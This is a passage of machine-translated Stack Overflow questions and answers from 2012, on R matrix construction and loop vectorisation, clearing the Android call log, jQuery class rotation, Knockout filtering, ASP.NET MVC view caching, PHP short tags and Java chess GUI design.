 [3,] -0.8 -0.7 -0.6 -0.5 -0.4 -0.3 -0.2 -0.1  0.0   0.1   0.2
 [4,] -0.7 -0.6 -0.5 -0.4 -0.3 -0.2 -0.1  0.0  0.1   0.2   0.3
 [5,] -0.6 -0.5 -0.4 -0.3 -0.2 -0.1  0.0  0.1  0.2   0.3   0.4
 [6,] -0.5 -0.4 -0.3 -0.2 -0.1  0.0  0.1  0.2  0.3   0.4   0.5
 [7,] -0.4 -0.3 -0.2 -0.1  0.0  0.1  0.2  0.3  0.4   0.5   0.6
 [8,] -0.3 -0.2 -0.1  0.0  0.1  0.2  0.3  0.4  0.5   0.6   0.7
 [9,] -0.2 -0.1  0.0  0.1  0.2  0.3  0.4  0.5  0.6   0.7   0.8
[10,] -0.1  0.0  0.1  0.2  0.3  0.4  0.5  0.6  0.7   0.8   0.9
[11,]  0.0  0.1  0.2  0.3  0.4  0.5  0.6  0.7  0.8   0.9   1.0 
```

反转列

```
mat <- mat[,rev(seq.int(ncol(mat)))] 
```

去掉上面的三角形：

```
mat[upper.tri(mat)] <- NA 
```

重新反转列：

```
mat <- mat[,rev(seq_len(ncol(mat)))]
mat

      [,1] [,2] [,3] [,4] [,5] [,6] [,7] [,8] [,9] [,10] [,11]
 [1,]   NA   NA   NA   NA   NA   NA   NA   NA   NA    NA   0.0
 [2,]   NA   NA   NA   NA   NA   NA   NA   NA   NA   0.0   0.1
 [3,]   NA   NA   NA   NA   NA   NA   NA   NA  0.0   0.1   0.2
 [4,]   NA   NA   NA   NA   NA   NA   NA  0.0  0.1   0.2   0.3
 [5,]   NA   NA   NA   NA   NA   NA  0.0  0.1  0.2   0.3   0.4
 [6,]   NA   NA   NA   NA   NA  0.0  0.1  0.2  0.3   0.4   0.5
 [7,]   NA   NA   NA   NA  0.0  0.1  0.2  0.3  0.4   0.5   0.6
 [8,]   NA   NA   NA  0.0  0.1  0.2  0.3  0.4  0.5   0.6   0.7
 [9,]   NA   NA  0.0  0.1  0.2  0.3  0.4  0.5  0.6   0.7   0.8
[10,]   NA  0.0  0.1  0.2  0.3  0.4  0.5  0.6  0.7   0.8   0.9
[11,]    0  0.1  0.2  0.3  0.4  0.5  0.6  0.7  0.8   0.9   1.0 
```

您可以从那里更改行名。

编辑：鉴于有这么多的解决方案，您可能有兴趣了解它们如何进行基准测试。使用`microbenchmark`：

```
Unit: microseconds
   expr       min         lq     median         uq       max
1 AGS()   682.491   738.9370   838.0955   892.8815  4518.740
2  DW()    23.244    27.1680    31.3930    34.8650    70.937
3 MvG() 15469.664 15920.4820 17352.3215 17827.4380 18989.270
4  SC()   118.629   131.4575   144.1360   157.7190   631.779 
```

@DWin 的解决方案似乎是最快的。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-08-02T23:38:20.120

一种可能的方法，使用我当前最喜欢的库：

```
library(plyr)
daply(expand.grid(x=seq(1,0,-.1), y=seq(0,1,.1)),
      .(y, x), with,
      if (x+y >= 1) x+y-1 else NA) 
```

这给出了以下结果：

```
 x
y      0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9   1
  0   NA  NA  NA  NA  NA  NA  NA  NA  NA  NA 0.0
  0.1 NA  NA  NA  NA  NA  NA  NA  NA  NA 0.0 0.1
  0.2 NA  NA  NA  NA  NA  NA  NA  NA 0.0 0.1 0.2
  0.3 NA  NA  NA  NA  NA  NA  NA 0.0 0.1 0.2 0.3
  0.4 NA  NA  NA  NA  NA  NA 0.0 0.1 0.2 0.3 0.4
  0.5 NA  NA  NA  NA  NA 0.0 0.1 0.2 0.3 0.4 0.5
  0.6 NA  NA  NA  NA 0.0 0.1 0.2 0.3 0.4 0.5 0.6
  0.7 NA  NA  NA 0.0 0.1 0.2 0.3 0.4 0.5 0.6 0.7
  0.8 NA  NA 0.0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8
  0.9 NA 0.0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9
  1    0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9 1.0 
```

这个想法是`expand.grid`创建所有可能的单元格值的数据框。您也可以使用`merge`它。然后对这些值中的每一个应用一个函数来计算单元格内容。并且已经`daply`把它变成了一个适合你的矩阵，包括名字。

**编辑：**
好的，您希望以相反的顺序标记列。`ddply`将对它们进行升序排序。所以试试这个：

```
daply(expand.grid(x=seq(0,1,.1), y=seq(0,1,.1)),
      .(y, x), with,
      if (y-x >= 0) y-x else NA)[,11:1] 
```

```
 x
y      1 0.9 0.8 0.7 0.6 0.5 0.4 0.3 0.2 0.1   0
  0   NA  NA  NA  NA  NA  NA  NA  NA  NA  NA 0.0
  0.1 NA  NA  NA  NA  NA  NA  NA  NA  NA 0.0 0.1
  0.2 NA  NA  NA  NA  NA  NA  NA  NA 0.0 0.1 0.2
  0.3 NA  NA  NA  NA  NA  NA  NA 0.0 0.1 0.2 0.3
  0.4 NA  NA  NA  NA  NA  NA 0.0 0.1 0.2 0.3 0.4
  0.5 NA  NA  NA  NA  NA 0.0 0.1 0.2 0.3 0.4 0.5
  0.6 NA  NA  NA  NA 0.0 0.1 0.2 0.3 0.4 0.5 0.6
  0.7 NA  NA  NA 0.0 0.1 0.2 0.3 0.4 0.5 0.6 0.7
  0.8 NA  NA 0.0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8
  0.9 NA 0.0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9
  1    0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9 1.0 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-02T23:01:59.157

```
require(matlab)
x=matrix(seq(0,1,.1),1)
X=x[rep(1,c(11)),]
X[upper.tri(X)]=NA
X=t(X)
for(a in 1:11){
  X[1:a,a]=rev(X[1:a,a])
}
X=flipud(X)
colnames(X) <- seq(1,0,by=-.1)
rownames(X) <- seq(0,1,by=.1) 
```

# android - 你如何在android中清除你的通话记录历史？

> ID：11786800
> 
> 赞同：5
> 
> 时间：2012-08-02T22:35:03.483
> 
> 标签：android, phone-call, calllog

如何清除android中的整个通话记录历史？目前我有这个代码只能清除特定的通话记录

```
public void DeleteCallLogByNumber(String number) {   
    String queryString="NUMBER="+number; 
    this.getContentResolver().delete(CallLog.Calls.CONTENT_URI,queryString,null);
    }  
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T23:06:57.650

我能够做到这一点，虽然已经有一段时间了。不确定这是否仍然有效。

```
getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, null, null) ; 
```

编辑：请注意，我不确定平台设计者是否打算让应用程序能够删除通话记录，[请参阅此开发博客文章](http://android-developers.blogspot.com/2010/05/be-careful-with-content-providers.html)。因此，尽管这在技术上确实有效，但请将此视为一个公平的警告，它可能在任何时候改变并破坏您正在尝试构建的内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T22:52:05.770

您无法通过单个 API 调用删除所有内容。

但是，您可以通过循环全部删除它们（如评论中所述）。为此，您需要[使用`Cursor`](http://www.higherpass.com/Android/Tutorials/Accessing-Data-With-Android-Cursors/4/). 请记住：该链接只会消除少于 60 秒的呼叫，因此您必须修改`Cursor`创建以删除所有呼叫。

另请注意：对于 API 11+，您应该使用[`CursorLoader`](http://developer.android.com/reference/android/content/CursorLoader.html)而不是`managedQuery(...)`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T23:11:34.703

试试这个：

```
String queryString="DURATION >= 0"; 
this.getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, queryString, null); 
```

# jquery - 将一组样式中的一个应用于每个选定项目

> ID：11786804
> 
> 赞同：-1
> 
> 时间：2012-08-02T22:35:21.457
> 
> 标签：jquery

我有 3 个（目前，将来可能会更多）样式，我想按旋转顺序添加到一组 div 中。

我要分配的类是：.blue、.red、.green

我有 4 个 div，我想按轮换顺序分配它们：

```
<div class="tripItem">
   ...
</div>
<div class="tripItem">
   ...
</div>
<div class="tripItem">
   ...
</div>
<div class="tripItem">
   ...
</div> 
```

我希望最终结果是：

```
<div class="tripItem blue">
   ...
</div>
<div class="tripItem red">
   ...
</div>
<div class="tripItem green">
   ...
</div>
<div class="tripItem blue">
   ...
</div> 
```

如果我要添加更多 div，则继续以相同的顺序旋转。

解决这个问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:38:36.150

您可以将回调传递给 [`addClass` *^([docs])*](http://api.jquery.com/addClass/)：

```
var classes =  ['blue', 'red', 'green'],
    len = classes.length;

$('div.tripItem').addClass(function(i) {
    return classes[i%len];
}); 
```

如果您想在列表中旋转，模数运算符是您的朋友[。](https://developer.mozilla.org/en/JavaScript/Reference/Operators/Arithmetic_Operators#.25_%28Modulus%29)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:37:58.640

```
var num = 0;
var colors = ['blue','red','green'];
$('.tripItem').each(function(){
    if(num >= colors.length) return false;
    $(this).addClass(colors[num]);
    num++;
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:40:46.217

```
​var colorArr = ['blue','red','green','yellow'];
$("div.tripItem").each(function(i){
    $(this).addClass(colorArr[i]);
});​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

[**演示**](http://jsfiddle.net/BRfUg/)

# javascript - 如何迭代 ko.ObervableArray

> ID：11786807
> 
> 赞同：0
> 
> 时间：2012-08-02T22:35:48.853
> 
> 标签：javascript, html, knockout.js

我有这个结构：

```
MyApp.User = function()
{
    var self = this;
    self.ID = ko.obervable();
    self.Name = ko.obervable();
    self.LastName = ko.observable();
}

MyApp.UserHub = function()
{
    self.users = ko.observableArray();

     $.getJSON("url", function (data) {
         var mappedUser = $.map(data.UsersFromJson, function (item) {
             return new MyApp.User(item);
         });
         self.users(mappedUsers);
     });
} 
```

我有一个 observableArray，我使用 HTML 请求和 JSON 填充了它（效果很好）。问题是我希望能够在那个 observableArray 中搜索一个用户，提供可以包含`LastName`在`FirstName`. 像这样的东西：

```
self.searchedUsers = ko.observableArray();
for(var item in users)
{
    if(item.FirstName.Contains(query) || item.LastName.Contains(query))
    {
         self.searchedUser.push(item);
    }
} 
```

Query 是我要搜索的输入文本值。任何人都可以帮助迭代`ObservableArray`吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-03T02:18:54.890

通常，您会希望创建一个计算的 observable 来表示您的数组的过滤版本。

所以，你会有类似的东西：

```
self.users = ko.observableArray();
self.query = ko.observable();
self.filteredUsers = ko.computed(function() {
    var query = self.query();    

    return ko.utils.arrayFilter(self.users(), function(user) {
        return user.FirstName.indexOf(query) > -1 || user.LastName.indexOf(query) > -1;
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-10T14:04:50.100

我还认为您必须遍历 self.users() 而不是 users。

users 是 observableArray 函数，而 users() 提供对底层数据的访问。

# asp.net-mvc - MVC 视图查找缓存。缓存多长时间？它缓存在哪里？

> ID：11786808
> 
> 赞同：3
> 
> 时间：2012-08-02T22:35:51.653
> 
> 标签：asp.net-mvc, asp.net-mvc-3, azure, mvc-mini-profiler

我们正在优化一个站点，并且已经阅读了关于初始视图查找需要很长时间的问题。随后对视图的查找会快得多。Mini-profiler 显示很多时间都在初始查找视图中（我知道我可以使用 ~ 路径来减少这种情况）以及在此阶段完成的任何其他操作。

缓存在哪里完成？视图查找等缓存了多长时间？我可以查看缓存的内容吗？我们能做些什么来让它预加载，这样就不会有延迟吗？

我们有许多视图通常几个小时都不会访问，我不希望性能突然出现高峰和低谷。

我们正在使用 Azure 并拥有许多 Web 角色实例。我可以假设每个 Web 角色都有自己的视图查找缓存吗？我们可以集中缓存，以便每个应用程序只发生一次吗？

我还读到 MVC4 查找视图更快？有人有数据吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T22:53:33.380

默认缓存为 15 分钟，存储在 HttpContext.Cache 中，这全部由**System.Web.Mvc.DefaultViewLocationCache**类管理。由于这使用标准 ASP.NET 缓存，您可以使用自定义缓存提供程序，从 WAZ AppFabric 缓存或新的缓存预览中获取缓存（NuGet 上有一个：http: [//nuget.org/packages/Glav.CacheAdapter](http://nuget.org/packages/Glav.CacheAdapter)）。使用共享缓存将确保只有 1 个实例需要完成解析视图的工作。或者你可以去建立你自己的缓存提供者。

在发布模式下运行您的应用程序，清除不需要的视图引擎，编写确切的路径而不是简单地调用 View，......都是加快视图查找过程的方法。在此处阅读更多信息：

*   [http://samsaffron.com/archive/2011/08/16/Oh+view+where+are+thou+finding+views+in+ASPNET+MVC3+](http://samsaffron.com/archive/2011/08/16/Oh+view+where+are+thou+finding+views+in+ASPNET+MVC3+)
*   [http://blogs.msdn.com/b/marcinon/archive/2011/08/16/optimizing-mvc-view-lookup-performance.aspx](http://blogs.msdn.com/b/marcinon/archive/2011/08/16/optimizing-mvc-view-lookup-performance.aspx)

您可以通过将每个视图的键添加到缓存中来预加载视图位置。您应该将其格式化如下（**这**是当前的 VirtualPathProviderViewEngine）：

```
string.Format((IFormatProvider) CultureInfo.InvariantCulture, ":ViewCacheEntry:{0}:{1}:{2}:{3}:{4}:", (object) this.GetType().AssemblyQualifiedName, (object) prefix, (object) name, (object) controllerName, (object) areaName); 
```

如果 MVC4 更快，我没有任何数据，但看起来 DefaultViewLocationCache 代码与 MVC3 相同。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-03T08:37:22.450

为了将我的缓存时间增加到 24 小时，我在 Global.asax 中使用了以下内容

```
 var viewEngine = new RazorViewEngine
                         {ViewLocationCache = new DefaultViewLocationCache(TimeSpan.FromHours(24))};
    //Only allow Razor view to improve for performance
    ViewEngines.Engines.Clear();
    ViewEngines.Engines.Add(viewEngine); 
```

此外，这篇文章[ASP.NET MVC Performance Issues with Render Partial](https://temebele.wordpress.com/2011/02/12/asp-net-mvc-performance-issues-with-render-partial/)也很有趣。

将考虑编写我自己的 ViewLocationCache 以利用共享的 Azure 缓存。

# php - PHP 代码适用于共享主机，但不适用于 Xampp

> ID：11786811
> 
> 赞同：2
> 
> 时间：2012-08-02T22:36:18.980
> 
> 标签：php, codeigniter, xampp

我有一个使用 Codeigniter 框架开发的 PHP 应用程序。

我的应用程序在我的共享托管服务 (Hostgator) 上完美运行，但在使用 Xampp 本地开发时无法正常运行。

我附上了一张截图，展示了我在 Xampp 中看到的内容与我在网络主机上看到的内容的示例。

到目前为止我尝试过的东西：

*   仔细检查数据库设置
*   重新安装 Xampp（这样做了 5 次......）
*   重启电脑
*   检查 Xampp apache 错误日志（那里没有任何用处）
*   检查端口是否被其他服务占用
*   在 codeigniter 中设置我的基本 URL 并将虚拟主机添加到 apache 配置文件
*   编辑 hosts 文件以将虚拟主机指向 localhost

![截屏](../Images/1e000a045f94d23c851d667d070b65e0.png)

这是我上图的代码：

```
<?if($this->data['site_logo']!=''):?>
      <img SRC="<?=$this->data['site_logo']?>" alt="<?=$this->data['site_name']?>" />
<?endif;?> 
```

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T22:39:01.637

短标签似乎在 xampp 上被禁用。

只需在问号后添加一个 php 即可。每个 PHP 部分都应该以

```
<?php 
```

更正确的版本

```
<?=$var?> 
```

是

```
<?php echo($var); ?> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T22:43:29.727

要启用短标签，请进入您的 php.ini 文件，找到包含以下内容的行：

```
short_open_tag = 0 
```

并将其更改为

```
short_open_tag = 1 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T22:39:19.630

您应该始终使用长 PHP 标签：

```
<?php if($this->data['site_logo']!=''): ?>
      <img SRC="<?php echo $this->data['site_logo'] ?>" alt="<?php echo $this->data['site_name'] ?>" />
<?php endif; ?> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-02T22:40:40.513

您是否已将 XAMPP 配置为允许使用短`<?`标签而不是默认`<?php`标签？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-02T22:40:36.403

`<?= ?>`是问题，换成`<?php echo ?>`

# java - 自我项目：使用 GUI 创建国际象棋游戏

> ID：11786812
> 
> 赞同：3
> 
> 时间：2012-08-02T22:36:23.410
> 
> 标签：java, user-interface, chess

我是一名经验有限的新程序员，希望在此基础上进行扩展。这是我将在校外尝试的第一个项目，所以我的资源波动很大，因为我根本不知道我需要知道什么。但是，我对使用 Java 的基本 GUI 有一些小的基础。

我想创建一个国际象棋游戏，然后实现一个人工智能。然而，目前我只是在构建游戏本身。现在，我想要一个简单的 GUI 框架，它不必看起来漂亮或复杂。只需显示棋盘，棋子在哪里，单击棋子，它将突出显示您可以去的地方，然后单击正方形，瞧，移动完成。

这是我在 GUI 界面设计中的主要问题。它是否与逻辑部分分开？换句话说，如果我创建一个 Piece，我是否需要有一个 .jpg 或其他东西，或者我是否可以有一个单独的类，如果这个正方形中有一个棋子，则在这些坐标中显示一个棋子图片。构建 GUI 我需要知道什么？我主要使用谷歌环顾四周，但如果有一个起点，我将不胜感激，同时知道是否可以继续在棋盘上工作，同时以不同的速度处理 GUI 部分。

提前谢谢，如果我提出的任何问题很容易找到信息，我很抱歉。我可能已经触及它，但没有认识到它对我想做的事情的重要性。

再次感谢 ：）

* * *

我会为任何有兴趣的人更新这个。我对我将要做的事情有了更好的形式，并且在我的脑海中有这个结构并在纸上翻译。现在，为了简单起见，一切都将使用 Java。

无论如何，很抱歉发了这么长的帖子。没有人必须阅读此内容。:)

我将尝试使用 MVC 格式，尽管它仍然可能让我有些困惑。

模型-我将创建一个拼板[8][8]。Piece 将是一个抽象类，由坐标和我现在调用的抽象方法 canMove(x,y) 组成。我最初也有 move(x,y) 但我意识到这些碎片不会移动。因此，我坚持使用 canMove 方法，让控制器查看 Piece 是否确实可以执行该操作。

控制器-在这里我将创建板并设置所有部分。我认为这将是最大的课程，因为它将几乎规范一切。

查看 - 这基本上是 GUI。

这就是我认为控制器/视图协调应该如何工作的方式。

1.  控制器中会有一个变量叫做hand。当我第一次点击一块时，它会检查它是否是黑色/白色，这是一块本身的参数。如果它是正确的颜色，它被分配到手。然后它将检查双精度数组中的每个正方形。如果 canMove() 为真，则在视图中突出显示该方块。然后第二次单击将检查 canMove()。如果为真，检查它是否被相同颜色的一块占据，如果不是，则移动到那里。如果是假的，什么都没有。如果你点击手，手就会变成空的。对我来说，问题在于视图如何与控制器交互。以后会想办法的。

2.  在每一步结束时，检查每一个棋子的 canMove() 看是否有国王在里面。如果是这样，请检查。对于将死，我想我会有一个完整的方法来标记国王周围的方块，看看它们是否都被标记了，包括他所在的那个。

所以我有几件事我也意识到我没有考虑到我必须弄清楚的事情。典当捕获和典当移动将非常具体。铸造。应用 canMove 时，必须没有任何障碍物，以防出现某些碎片。

构建视图将是一种痛苦，因为我的课程都没有教给我任何关于它的东西。我想，我会坚持到最后。Idk 我将如何在没有视图的情况下进行测试，但可能不会持久。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:39:12.470

> 这是我在 GUI 界面设计中的主要问题。它是否与逻辑部分分开？

绝对没错。

国际象棋引擎和用户界面实际上是两个完全不同的程序，在不同的进程中运行是很常见的。

国际象棋引擎通常针对速度进行了优化，并且通常用 C 或 C++ 编写（但如果您愿意，也可以使用 Java）。GUI 通常是用 Java 编写的。引擎和 GUI 通常由具有不同技能的完全不同的程序员团队编写。

有用于通信的标准协议，例如[通用国际象棋接口](http://en.wikipedia.org/wiki/Universal_Chess_Interface)，也称为 UCI。如果您采用此标准，您可以编写自己的 GUI 并将其与现有引擎一起使用。然后，如果您稍后编写自己的引擎来实现 UCI 协议，您只需更改 GUI 中的设置以使用您的引擎。

正如评论中提到的那样，实施 UCI 标准对于您的第一个项目来说可能有点多。但是，我希望了解它在现实世界中是如何完成的，可以为您选择的任何设计提供一些灵感。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T22:39:03.870

这是一个模糊的“问题”，但这里有几个初始指针：

*   阅读[模型-视图-控制器模式](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller)（是的，业务逻辑将在模型中，而 GUI 将是视图。）

*   尝试使用`GridLayout`.

*   在单元格中使用`JLabel`s 或`JButton`s

    *   他们可以轻松地显示图像
    *   您可以将它们的背景设置为黑色或白色，并且
    *   您可以轻松地收听他们的点击。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T22:39:03.527

一句话，是的。业务逻辑和表示应该是分开的。阅读[MVC](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller)。祝你好运。

编辑：阅读[MVP](http://nirajrules.wordpress.com/2009/07/18/mvc-vs-mvp-vs-mvvm/)可能也是一个好主意。不过要带走的要点是您的应用程序逻辑应该与显示分离。对于刚接触编程的人来说，这听起来像是一个雄心勃勃的项目——希望这对你来说是一次很棒的学习经历。

# r - 将这个丑陋的 for 循环转换为对 R 更友好的东西

> ID：11786813
> 
> 赞同：7
> 
> 时间：2012-08-02T22:36:38.337
> 
> 标签：r, loops, aggregate, vectorization

一直使用 SO 作为我工作的资源。感谢您将这样一个伟大的社区团结在一起。

我正在尝试做一些有点复杂的事情，而我现在唯一能想到的方法是使用一对嵌套的 for 循环（我知道这在 R 中是不受欢迎的）......我有 300 万的记录-奇数课程注册：学生用户 ID 与 CourseID 配对。在每一行中，都有一堆数据，包括开始/结束日期和分数等。我需要做的是，对于每次注册，计算该用户在注册课程之前所学课程的平均分数。

我用于 for 循环的代码如下：

```
data$Mean.Prior.Score <- 0
for (i in as.numeric(rownames(data)) {
    sum <- 0
    count <- 0
    for (j in as.numeric(rownames(data[data$UserID == data$UserID[i],]))) {
            if (data$Course.End.Date[j] < data$Course.Start.Date[i]) {
                sum <- sum + data$Score[j]
                count <- count + 1
            }
    }
if (count != 0)
    data$Mean.Prior.Score[i] <- sum / count
} 
```

我很确定这会起作用，但它运行得非常慢......我的数据框有超过 300 万行，但经过 10 分钟的运行，外部循环只运行了 850 条记录。这似乎比时间复杂度所暗示的要慢得多，尤其是考虑到每个用户平均只有 5 或 6 门课程。

哦，我应该提到我在运行循环之前用 as.POSIXct() 转换了日期字符串，所以日期比较步骤不应该太慢......

必须有更好的方法来做到这一点......有什么建议吗？

* * *

编辑：根据 mnel 的要求......终于`dput`可以玩得很好了。不得不补充`control = NULL`。这里是：

```
structure(list(Username = structure(1:20, .Label = c("100225", 
"100226", "100228", "1013170", "102876", "105796", "106753", 
"106755", "108568", "109038", "110150", "110200", "110350", "111873", 
"111935", "113579", "113670", "117562", "117869", "118329"), class = "factor"), 
User.ID = c(2313737L, 2314278L, 2314920L, 9708829L, 2325896L, 
2315617L, 2314644L, 2314977L, 2330148L, 2315081L, 2314145L, 
2316213L, 2317734L, 2314363L, 2361187L, 2315374L, 2314250L, 
2361507L, 2325592L, 2360182L), Course.ID = c(2106468L, 2106578L, 
2106493L, 5426406L, 2115455L, 2107320L, 2110286L, 2110101L, 
2118574L, 2106876L, 2110108L, 2110058L, 2109958L, 2108222L, 
2127976L, 2106638L, 2107020L, 2127451L, 2117022L, 2126506L
), Course = structure(c(1L, 7L, 10L, 15L, 11L, 19L, 4L, 6L, 
3L, 12L, 2L, 9L, 17L, 8L, 20L, 18L, 13L, 16L, 5L, 14L), .Label = c("ACCT212_A", 
"BIOS200_N", "BIS220_T", "BUSN115_A", "BUSN115_T", "CARD205_A", 
"CIS211_A", "CIS275_X", "CIS438_S", "ENGL112_A", "ENGL112_B", 
"ENGL227_K", "GM400_A", "GM410_A", "HUMN232_M", "HUMN432_W", 
"HUMN445_A", "MATH100_X", "MM575_A", "PSYC110_Y"), class = "factor"), 
Course.Start.Date = structure(c(1098662400, 1098662400, 1098662400, 
1309737600, 1099267200, 1098662400, 1099267200, 1099267200, 
1098662400, 1098662400, 1099267200, 1099267200, 1099267200, 
1098662400, 1104105600, 1098662400, 1098662400, 1104105600, 
1098662400, 1104105600), class = c("POSIXct", "POSIXt"), tzone = "GMT"), 
Term.ID = c(12056L, 12056L, 12056L, 66282L, 12057L, 12056L, 
12057L, 12057L, 12056L, 12056L, 12057L, 12057L, 12057L, 12056L, 
13469L, 12056L, 12056L, 13469L, 12056L, 13469L), Term.Name = structure(c(2L, 
2L, 2L, 4L, 1L, 2L, 1L, 1L, 2L, 2L, 1L, 1L, 1L, 2L, 3L, 2L, 
2L, 3L, 2L, 3L), .Label = c("Fall 2004", "Fall 2004 Session A", 
"Fall 2004 Session B", "Summer Session A 2011"), class = "factor"), 
Term.Start.Date = structure(c(1L, 1L, 1L, 4L, 2L, 1L, 2L, 
2L, 1L, 1L, 2L, 2L, 2L, 1L, 3L, 1L, 1L, 3L, 1L, 3L), .Label = c("2004-10-21", 
"2004-10-28", "2004-12-27", "2011-06-26"), class = "factor"), 
Score = c(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.125, 
0, 0, 0, 0, 0), First.Course.Date = structure(c(1L, 1L, 1L, 
4L, 2L, 1L, 2L, 2L, 1L, 1L, 2L, 2L, 2L, 1L, 3L, 1L, 1L, 3L, 
1L, 3L), .Label = c("2004-10-25", "2004-11-01", "2004-12-27", 
"2011-07-04"), class = "factor"), First.Term.Date = structure(c(1L, 
1L, 1L, 4L, 2L, 1L, 2L, 2L, 1L, 1L, 2L, 2L, 2L, 1L, 3L, 1L, 
1L, 3L, 1L, 3L), .Label = c("2004-10-21", "2004-10-28", "2004-12-27", 
"2011-06-26"), class = "factor"), First.Timer = c(TRUE, TRUE, 
TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, 
TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, TRUE, TRUE), Course.Code = structure(c(1L, 
6L, 9L, 13L, 9L, 17L, 4L, 5L, 3L, 10L, 2L, 8L, 15L, 7L, 18L, 
16L, 11L, 14L, 4L, 12L), .Label = c("ACCT212", "BIOS200", 
"BIS220", "BUSN115", "CARD205", "CIS211", "CIS275", "CIS438", 
"ENGL112", "ENGL227", "GM400", "GM410", "HUMN232", "HUMN432", 
"HUMN445", "MATH100", "MM575", "PSYC110"), class = "factor"), 
Course.End.Date = structure(c(1L, 1L, 1L, 4L, 2L, 1L, 2L, 
2L, 1L, 1L, 2L, 2L, 2L, 1L, 3L, 1L, 1L, 3L, 1L, 3L), .Label = c("2004-12-19", 
"2005-02-27", "2005-03-26", "2011-08-28"), class = "factor")), .Names = c("Username", 
"User.ID", "Course.ID", "Course", "Course.Start.Date", "Term.ID", 
"Term.Name", "Term.Start.Date", "Score", "First.Course.Date", 
"First.Term.Date", "First.Timer", "Course.Code", "Course.End.Date"
), row.names = c(NA, 20L), class = "data.frame") 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T03:07:35.820

我发现`data.table`效果很好。

```
# Create some data.
library(data.table)
set.seed(1)
n=3e6
numCourses=5 # Average courses per student
data=data.table(UserID=as.character(round(runif(n,1,round(n/numCourses)))),course=1:n,Score=runif(n),CourseStartDate=as.Date('2000-01-01')+round(runif(n,1,365)))
data$CourseEndDate=data$CourseStartDate+round(runif(n,1,100))
setkey(data,UserID)
# test=function(CourseEndDate,Score,CourseStartDate) sapply(CourseStartDate, function(y) mean(Score[y>CourseEndDate]))
# I vastly reduced the number of comparisons with a better "test" function.
test2=function(CourseEndDate,Score,CourseStartDate) {
    o.end = order(CourseEndDate)
    run.avg = cumsum(Score[o.end])/seq_along(CourseEndDate)
    idx=findInterval(CourseStartDate,CourseEndDate[o.end])
    idx=ifelse(idx==0,NA,idx)
    run.avg[idx]
}
system.time(data$MeanPriorScore<-data[,test2(CourseEndDate,Score,CourseStartDate),by=UserID]$V1) 
#  For three million courses, at an average of 5 courses per student:
#    user  system elapsed 
#    122.06    0.22  122.45 
```

* * *

运行测试以查看它是否与您的代码相同：

```
set.seed(1)
n=1e2
data=data.table(UserID=as.character(round(runif(n,1,1000))),course=1:n,Score=runif(n),CourseStartDate=as.Date('2000-01-01')+round(runif(n,1,365)))
data$CourseEndDate=data$CourseStartDate+round(runif(n,1,100))
setkey(data,UserID)
data$MeanPriorScore<-data[,test2(CourseEndDate,Score,CourseStartDate),by=UserID]$V1
data["246"]
#   UserID course     Score CourseStartDate CourseEndDate MeanPriorScore
#1:    246     54 0.4531314      2000-08-09    2000-09-20      0.9437248
#2:    246     89 0.9437248      2000-02-19    2000-03-02             NA

# A comparison with your for loop (slightly modified)
data$MeanPriorScore.old<-NA # Set to NaN instead of zero for easy comparison.
# I think you forgot a bracket here. Also, There is no need to work with the rownames.
for (i in seq(nrow(data))) { 
    sum <- 0
    count <- 0
    # I reduced the complexity of figuring out the vector to loop through.
    # It will result in the exact same thing if there are no rownames.
    for (j in which(data$UserID == data$UserID[i])) {
            if (data$CourseEndDate[j] <= data$CourseStartDate[i]) {
                sum <- sum + data$Score[j]
                count <- count + 1
            }
    }
    # I had to add "[i]" here. I think that is what you meant.
    if (count != 0) data$MeanPriorScore.old[i] <- sum / count 
}
identical(data$MeanPriorScore,data$MeanPriorScore.old)
# [1] TRUE 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T23:21:55.193

这似乎是你想要的

```
library(data.table) 
# create a data.table object
DT <- data.table(data)
# key by userID 
setkeyv(DT, 'userID')

# for each userID, where the Course.End.Date < Course.Start.Date
# return the mean score

# This is too simplistic
# DT[Course.End.Date < Course.Start.Date,
#   list(Mean.Prior.Score = mean(Score)) , 
#   by = list(userID)] 
```

根据@jorans 的评论，这将比上面的代码更复杂。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-03T00:34:57.547

